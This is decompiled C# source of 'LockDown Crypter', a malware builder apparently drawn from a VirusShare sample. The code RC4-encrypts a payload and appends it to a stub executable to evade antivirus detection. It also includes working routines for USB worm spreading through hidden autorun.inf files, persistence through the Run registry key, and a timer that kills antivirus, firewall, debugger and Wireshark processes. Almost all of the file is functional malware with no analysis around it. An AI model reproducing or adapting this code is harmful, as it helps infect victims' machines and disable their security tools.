// Decompiled with JetBrains decompiler
// Type: WindowsApplication1.Form1
// Assembly: LockDown Crypter, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E612EFC1-DF1A-4096-B236-845A4BE1D4EB
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Constructor.MSIL.LockDown.a-5a556b4a8d4ef4fd03b0f3f4b615a68def8d09204c11f3f86f2ab3be70939874.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using WindowsApplication1.My;

namespace WindowsApplication1
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("PictureBox2")]
    private PictureBox _PictureBox2;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("Button3")]
    private Button _Button3;
    [AccessedThroughProperty("PictureBox1")]
    private PictureBox _PictureBox1;
    [AccessedThroughProperty("Button2")]
    private Button _Button2;
    [AccessedThroughProperty("CheckBox1")]
    private CheckBox _CheckBox1;
    [AccessedThroughProperty("CheckBox2")]
    private CheckBox _CheckBox2;
    [AccessedThroughProperty("CheckBox3")]
    private CheckBox _CheckBox3;
    [AccessedThroughProperty("CheckBox4")]
    private CheckBox _CheckBox4;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    private Point Point;
    private int X;
    private int Y;
    private OpenFileDialog ofd1;
    private OpenFileDialog ofd2;
    private string first;
    private string second;
    private string stub;
    private const string z = "@thefilesplit@";
    private string location1;
    private string location2;
    private const string filesplit = "@ThatOneGuyWithAids@";

    public Form1()
    {
      this.MouseMove += new MouseEventHandler(this.Main_MouseMove);
      this.MouseDown += new MouseEventHandler(this.Main_MouseDown);
      this.Load += new EventHandler(this.Form1_Load);
      this.Point = new Point();
      this.ofd1 = new OpenFileDialog();
      this.ofd2 = new OpenFileDialog();
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.PictureBox2 = new PictureBox();
      this.Button1 = new Button();
      this.TextBox1 = new TextBox();
      this.Button3 = new Button();
      this.PictureBox1 = new PictureBox();
      this.Button2 = new Button();
      this.CheckBox1 = new CheckBox();
      this.CheckBox2 = new CheckBox();
      this.CheckBox3 = new CheckBox();
      this.CheckBox4 = new CheckBox();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      ((ISupportInitialize) this.PictureBox2).BeginInit();
      ((ISupportInitialize) this.PictureBox1).BeginInit();
      this.SuspendLayout();
      this.PictureBox2.BackColor = System.Drawing.Color.Black;
      this.PictureBox2.BackgroundImage = (Image) WindowsApplication1.My.Resources.Resources.min;
      PictureBox pictureBox2_1 = this.PictureBox2;
      Point point1 = new Point(375, 2);
      Point point2 = point1;
      pictureBox2_1.Location = point2;
      this.PictureBox2.Name = "PictureBox2";
      PictureBox pictureBox2_2 = this.PictureBox2;
      Size size1 = new Size(27, 27);
      Size size2 = size1;
      pictureBox2_2.Size = size2;
      this.PictureBox2.TabIndex = 1;
      this.PictureBox2.TabStop = false;
      this.Button1.BackColor = System.Drawing.Color.Blue;
      Button button1_1 = this.Button1;
      point1 = new Point(187, 185);
      Point point3 = point1;
      button1_1.Location = point3;
      this.Button1.Name = "Button1";
      Button button1_2 = this.Button1;
      size1 = new Size(75, 23);
      Size size3 = size1;
      button1_2.Size = size3;
      this.Button1.TabIndex = 2;
      this.Button1.Text = "Crypt";
      this.Button1.UseVisualStyleBackColor = false;
      TextBox textBox1_1 = this.TextBox1;
      point1 = new Point(84, 2);
      Point point4 = point1;
      textBox1_1.Location = point4;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_2 = this.TextBox1;
      size1 = new Size(100, 20);
      Size size4 = size1;
      textBox1_2.Size = size4;
      this.TextBox1.TabIndex = 3;
      this.TextBox1.Text = "   file to crypt here";
      this.Button3.BackColor = System.Drawing.Color.Blue;
      Button button3_1 = this.Button3;
      point1 = new Point(351, 287);
      Point point5 = point1;
      button3_1.Location = point5;
      this.Button3.Name = "Button3";
      Button button3_2 = this.Button3;
      size1 = new Size(75, 23);
      Size size5 = size1;
      button3_2.Size = size5;
      this.Button3.TabIndex = 5;
      this.Button3.Text = "Credits";
      this.Button3.UseVisualStyleBackColor = false;
      this.PictureBox1.BackColor = System.Drawing.Color.Black;
      this.PictureBox1.BackgroundImage = (Image) WindowsApplication1.My.Resources.Resources.close;
      PictureBox pictureBox1_1 = this.PictureBox1;
      point1 = new Point(399, 2);
      Point point6 = point1;
      pictureBox1_1.Location = point6;
      this.PictureBox1.Name = "PictureBox1";
      PictureBox pictureBox1_2 = this.PictureBox1;
      size1 = new Size(27, 27);
      Size size6 = size1;
      pictureBox1_2.Size = size6;
      this.PictureBox1.TabIndex = 6;
      this.PictureBox1.TabStop = false;
      this.Button2.BackColor = System.Drawing.Color.Blue;
      Button button2_1 = this.Button2;
      point1 = new Point(3, 2);
      Point point7 = point1;
      button2_1.Location = point7;
      this.Button2.Name = "Button2";
      Button button2_2 = this.Button2;
      size1 = new Size(75, 20);
      Size size7 = size1;
      button2_2.Size = size7;
      this.Button2.TabIndex = 7;
      this.Button2.Text = "Browse";
      this.Button2.UseVisualStyleBackColor = false;
      this.CheckBox1.AutoSize = true;
      this.CheckBox1.BackColor = System.Drawing.Color.Transparent;
      CheckBox checkBox1_1 = this.CheckBox1;
      point1 = new Point(29, 40);
      Point point8 = point1;
      checkBox1_1.Location = point8;
      this.CheckBox1.Name = "CheckBox1";
      CheckBox checkBox1_2 = this.CheckBox1;
      size1 = new Size(101, 17);
      Size size8 = size1;
      checkBox1_2.Size = size8;
      this.CheckBox1.TabIndex = 8;
      this.CheckBox1.Text = "Enable All Antis'";
      this.CheckBox1.UseVisualStyleBackColor = false;
      this.CheckBox2.AutoSize = true;
      this.CheckBox2.BackColor = System.Drawing.Color.Transparent;
      CheckBox checkBox2_1 = this.CheckBox2;
      point1 = new Point(29, 63);
      Point point9 = point1;
      checkBox2_1.Location = point9;
      this.CheckBox2.Name = "CheckBox2";
      CheckBox checkBox2_2 = this.CheckBox2;
      size1 = new Size(87, 17);
      Size size9 = size1;
      checkBox2_2.Size = size9;
      this.CheckBox2.TabIndex = 9;
      this.CheckBox2.Text = "EOF Support";
      this.CheckBox2.UseVisualStyleBackColor = false;
      this.CheckBox3.AutoSize = true;
      this.CheckBox3.BackColor = System.Drawing.Color.Transparent;
      CheckBox checkBox3_1 = this.CheckBox3;
      point1 = new Point(29, 86);
      Point point10 = point1;
      checkBox3_1.Location = point10;
      this.CheckBox3.Name = "CheckBox3";
      CheckBox checkBox3_2 = this.CheckBox3;
      size1 = new Size(86, 17);
      Size size10 = size1;
      checkBox3_2.Size = size10;
      this.CheckBox3.TabIndex = 10;
      this.CheckBox3.Text = "Usbspreader";
      this.CheckBox3.UseVisualStyleBackColor = false;
      this.CheckBox4.AutoSize = true;
      this.CheckBox4.BackColor = System.Drawing.Color.Transparent;
      CheckBox checkBox4_1 = this.CheckBox4;
      point1 = new Point(29, 109);
      Point point11 = point1;
      checkBox4_1.Location = point11;
      this.CheckBox4.Name = "CheckBox4";
      CheckBox checkBox4_2 = this.CheckBox4;
      size1 = new Size(94, 17);
      Size size11 = size1;
      checkBox4_2.Size = size11;
      this.CheckBox4.TabIndex = 11;
      this.CheckBox4.Text = "Add to Startup";
      this.CheckBox4.UseVisualStyleBackColor = false;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) WindowsApplication1.My.Resources.Resources.sexy_gui;
      size1 = new Size(427, 310);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.CheckBox4);
      this.Controls.Add((Control) this.CheckBox3);
      this.Controls.Add((Control) this.CheckBox2);
      this.Controls.Add((Control) this.CheckBox1);
      this.Controls.Add((Control) this.Button2);
      this.Controls.Add((Control) this.PictureBox1);
      this.Controls.Add((Control) this.Button3);
      this.Controls.Add((Control) this.TextBox1);
      this.Controls.Add((Control) this.Button1);
      this.Controls.Add((Control) this.PictureBox2);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (Form1);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "GUI Ryan";
      ((ISupportInitialize) this.PictureBox2).EndInit();
      ((ISupportInitialize) this.PictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual PictureBox PictureBox2
    {
      [DebuggerNonUserCode] get => this._PictureBox2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.PictureBox2_Click);
        if (this._PictureBox2 != null)
          this._PictureBox2.Click -= eventHandler;
        this._PictureBox2 = value;
        if (this._PictureBox2 == null)
          return;
        this._PictureBox2.Click += eventHandler;
      }
    }

    internal virtual Button Button1
    {
      [DebuggerNonUserCode] get => this._Button1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
        if (this._Button1 != null)
          this._Button1.Click -= eventHandler;
        this._Button1 = value;
        if (this._Button1 == null)
          return;
        this._Button1.Click += eventHandler;
      }
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual Button Button3
    {
      [DebuggerNonUserCode] get => this._Button3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button3_Click);
        if (this._Button3 != null)
          this._Button3.Click -= eventHandler;
        this._Button3 = value;
        if (this._Button3 == null)
          return;
        this._Button3.Click += eventHandler;
      }
    }

    internal virtual PictureBox PictureBox1
    {
      [DebuggerNonUserCode] get => this._PictureBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.PictureBox1_Click_1);
        if (this._PictureBox1 != null)
          this._PictureBox1.Click -= eventHandler;
        this._PictureBox1 = value;
        if (this._PictureBox1 == null)
          return;
        this._PictureBox1.Click += eventHandler;
      }
    }

    internal virtual Button Button2
    {
      [DebuggerNonUserCode] get => this._Button2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button2_Click_1);
        if (this._Button2 != null)
          this._Button2.Click -= eventHandler;
        this._Button2 = value;
        if (this._Button2 == null)
          return;
        this._Button2.Click += eventHandler;
      }
    }

    internal virtual CheckBox CheckBox1
    {
      [DebuggerNonUserCode] get => this._CheckBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CheckBox1_CheckedChanged);
        if (this._CheckBox1 != null)
          this._CheckBox1.CheckedChanged -= eventHandler;
        this._CheckBox1 = value;
        if (this._CheckBox1 == null)
          return;
        this._CheckBox1.CheckedChanged += eventHandler;
      }
    }

    internal virtual CheckBox CheckBox2
    {
      [DebuggerNonUserCode] get => this._CheckBox2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CheckBox2_CheckedChanged);
        if (this._CheckBox2 != null)
          this._CheckBox2.CheckedChanged -= eventHandler;
        this._CheckBox2 = value;
        if (this._CheckBox2 == null)
          return;
        this._CheckBox2.CheckedChanged += eventHandler;
      }
    }

    internal virtual CheckBox CheckBox3
    {
      [DebuggerNonUserCode] get => this._CheckBox3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CheckBox3_CheckedChanged);
        if (this._CheckBox3 != null)
          this._CheckBox3.CheckedChanged -= eventHandler;
        this._CheckBox3 = value;
        if (this._CheckBox3 == null)
          return;
        this._CheckBox3.CheckedChanged += eventHandler;
      }
    }

    internal virtual CheckBox CheckBox4
    {
      [DebuggerNonUserCode] get => this._CheckBox4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CheckBox4_CheckedChanged);
        if (this._CheckBox4 != null)
          this._CheckBox4.CheckedChanged -= eventHandler;
        this._CheckBox4 = value;
        if (this._CheckBox4 == null)
          return;
        this._CheckBox4.CheckedChanged += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    [DllImport("kernel32", EntryPoint = "RtlMoveMemory", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern void CopyMemory(long Destination, long Source, int Length);

    private void Main_MouseMove(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
      this.Point = Control.MousePosition;
      checked { this.Point.X -= this.X; }
      checked { this.Point.Y -= this.Y; }
      this.Location = this.Point;
    }

    private void Main_MouseDown(object sender, MouseEventArgs e)
    {
      this.X = checked (Control.MousePosition.X - this.Location.X);
      this.Y = checked (Control.MousePosition.Y - this.Location.Y);
    }

    private void Form1_Load(object sender, EventArgs e)
    {
    }

    private void PictureBox1_Click(object sender, EventArgs e) => this.Close();

    private void PictureBox2_Click(object sender, EventArgs e) => this.WindowState = FormWindowState.Minimized;

    private void Button3_Click(object sender, EventArgs e)
    {
      int num = (int) Interaction.MsgBox((object) "Credits: 70% to me(ThatOneGuyWithAids from HF 30% to HF for their tutorials");
    }

    private void Button2_Click(object sender, EventArgs e)
    {
      OpenFileDialog openFileDialog = new OpenFileDialog();
      if (openFileDialog.ShowDialog() != DialogResult.OK)
        return;
      this.TextBox1.Text = openFileDialog.FileName;
    }

    private void PictureBox1_Click_1(object sender, EventArgs e) => this.Close();

    private void Button1_Click(object sender, EventArgs e)
    {
      SaveFileDialog saveFileDialog = new SaveFileDialog();
      if (saveFileDialog.ShowDialog() != DialogResult.OK)
        return;
      string fileName = saveFileDialog.FileName;
      FileSystem.FileOpen(1, this.TextBox1.Text, OpenMode.Binary, OpenAccess.Read);
      string message = Strings.Space(checked ((int) FileSystem.LOF(1)));
      FileSystem.FileGet(1, ref message);
      FileSystem.FileClose(1);
      FileSystem.FileOpen(1, Application.StartupPath + "\\Stub.exe", OpenMode.Binary, OpenAccess.Read);
      string str = Strings.Space(checked ((int) FileSystem.LOF(1)));
      FileSystem.FileGet(1, ref str);
      FileSystem.FileClose(1);
      FileSystem.FileOpen(1, fileName, OpenMode.Binary, OpenAccess.ReadWrite);
      FileSystem.FilePut(1, str + "@ThatOneGuyWithAids@" + this.rc4(message, "ThatOneGuyWithAids"), -1L, false);
      FileSystem.FileClose(1);
      if (this.CheckBox1.Checked)
      {
        this.Timer1.Start();
        if (this.CheckBox2.Checked)
        {
          this.GetEOF(this.TextBox1.Text);
          if (this.CheckBox3.Checked)
          {
            this.Usbspreader();
            if (this.CheckBox4.Checked)
            {
              Form1.AddStartup(this.Text, Application.ExecutablePath);
              FileSystem.FileClose(1);
              int num = (int) Interaction.MsgBox((object) "Crypted!");
              this.Close();
            }
          }
        }
      }
      int num1 = (int) Interaction.MsgBox((object) "Crypted!");
      this.Close();
    }

    public string rc4(string message, string password)
    {
      int index1 = 0;
      int index2 = 0;
      StringBuilder stringBuilder = new StringBuilder();
      string empty = string.Empty;
      int[] numArray1 = new int[257];
      int[] numArray2 = new int[257];
      int length = password.Length;
      int location1 = 0;
      while (location1 <= (int) byte.MaxValue)
      {
        char String = password.Substring(location1 % length, 1).ToCharArray()[0];
        numArray2[location1] = Strings.Asc(String);
        numArray1[location1] = location1;
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      int index3 = 0;
      int location2 = 0;
      while (location2 <= (int) byte.MaxValue)
      {
        index3 = checked (index3 + numArray1[location2] + numArray2[location2]) % 256;
        int num = numArray1[location2];
        numArray1[location2] = numArray1[index3];
        numArray1[index3] = num;
        Math.Max(Interlocked.Increment(ref location2), checked (location2 - 1));
      }
      location1 = 1;
      while (location1 <= message.Length)
      {
        index1 = checked (index1 + 1) % 256;
        index2 = checked (index2 + numArray1[index1]) % 256;
        int num1 = numArray1[index1];
        numArray1[index1] = numArray1[index2];
        numArray1[index2] = num1;
        int num2 = numArray1[checked (numArray1[index1] + numArray1[index2]) % 256];
        int CharCode = Strings.Asc(message.Substring(checked (location1 - 1), 1).ToCharArray()[0]) ^ num2;
        stringBuilder.Append(Strings.Chr(CharCode));
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      string str = stringBuilder.ToString();
      stringBuilder.Length = 0;
      return str;
    }

    public long GetEOF(string Path)
    {
      FileSystem.FileOpen(10, Path, OpenMode.Binary);
      Array array = (Array) new byte[checked ((int) (FileSystem.LOF(10) - 1L) + 1)];
      FileSystem.FileGet(10, ref array);
      byte[] numArray = (byte[]) array;
      FileSystem.FileClose(10);
      long Destination1;
      Form1.CopyMemory(Destination1, (long) numArray[60], 4);
      int Destination2;
      Form1.CopyMemory((long) Destination2, (long) numArray[checked ((int) (Destination1 + 6L))], 2);
      long num = checked (Destination1 + 248L + (long) ((Destination2 - 1) * 40));
      long Destination3;
      Form1.CopyMemory(Destination3, (long) numArray[checked ((int) (num + 16L))], 4);
      long Destination4;
      Form1.CopyMemory(Destination4, (long) numArray[checked ((int) (num + 20L))], 4);
      return checked (Destination3 + Destination4);
    }

    public void Usbspreader()
    {
      Path.GetFileName(Application.ExecutablePath);
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) true, RegistryValueKind.DWord);
      string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
      string[] logicalDrives = Directory.GetLogicalDrives();
      int index = 0;
      while (index < logicalDrives.Length)
      {
        string str = logicalDrives[index];
        if (!programFiles.Contains(str))
        {
          MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, str + "System32.exe", true);
          MyProject.Computer.FileSystem.WriteAllText(str + "autorun.inf", "[autorun]\r\nopen=" + str + "System32.exe\r\nshellexecute=" + str, true);
          FileSystem.SetAttr(str + "System32.exe", FileAttribute.Hidden);
          FileSystem.SetAttr(str + "autorun.inf", FileAttribute.Hidden);
        }
        checked { ++index; }
      }
    }

    public static void AddStartup(string Name, string Path) => Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Name, (object) Path, RegistryValueKind.String);

    public void AntiKeyscrambler()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "keyscrambler", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiWireshark()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "wireshark", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiAnubis()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "anubis", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiMalwarebytes()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "mbam", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiKaspersky()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "avp", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiOllydbg()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "ollydbg", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiOutpost()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "outpost", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiNorman()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "npfmsg", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiBitDefender()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "bdagent", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiNOD32()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "egui", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    public void AntiZoneAlarm()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        if (Operators.CompareString(Strings.LCase(processes[index].ProcessName), "zlclient", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      this.AntiBitDefender();
      this.AntiKaspersky();
      this.AntiKeyscrambler();
      this.AntiMalwarebytes();
      this.AntiNOD32();
      this.AntiNorman();
      this.AntiOllydbg();
      this.AntiOutpost();
      this.AntiWireshark();
    }

    private void CheckBox2_CheckedChanged(object sender, EventArgs e)
    {
      if (!this.CheckBox2.Checked)
        return;
      this.GetEOF(this.TextBox1.Text);
    }

    private void CheckBox3_CheckedChanged(object sender, EventArgs e)
    {
      if (!this.CheckBox3.Checked)
        return;
      this.Usbspreader();
    }

    private void CheckBox4_CheckedChanged(object sender, EventArgs e)
    {
      if (!this.CheckBox4.Checked)
        return;
      Form1.AddStartup(this.Text, Application.ExecutablePath);
    }

    private void CheckBox1_CheckedChanged(object sender, EventArgs e)
    {
      if (!this.CheckBox1.Checked)
        return;
      this.Timer1.Start();
    }

    private void Button2_Click_1(object sender, EventArgs e)
    {
      OpenFileDialog openFileDialog = new OpenFileDialog();
      if (openFileDialog.ShowDialog() != DialogResult.OK)
        return;
      this.TextBox1.Text = openFileDialog.FileName;
    }
  }
}
